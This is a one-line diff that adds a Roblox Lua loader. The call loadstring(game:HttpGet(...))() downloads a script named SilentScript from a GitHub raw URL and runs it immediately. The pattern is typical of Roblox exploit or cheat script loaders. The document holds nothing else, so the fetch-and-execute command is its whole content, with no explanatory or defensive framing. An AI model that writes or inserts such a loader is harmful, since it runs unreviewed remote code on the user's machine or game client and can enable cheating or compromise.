@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pingzz0/SilentScript/refs/heads/main/main.lua"))()
